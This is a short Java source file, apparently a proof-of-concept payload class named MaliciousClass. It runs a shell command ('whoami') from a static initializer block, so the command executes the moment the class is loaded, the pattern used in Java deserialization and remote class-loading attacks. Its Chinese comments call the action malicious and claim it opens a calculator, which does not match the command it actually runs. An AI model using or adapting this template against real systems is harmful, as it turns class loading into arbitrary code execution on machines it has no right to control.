package com.example.malicious;

public class MaliciousClass {
    // 静态初始化块
    static {
        try {
            // 执行恶意操作，比如在Unix系统上尝试打开计算器
            Runtime.getRuntime().exec("whoami");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
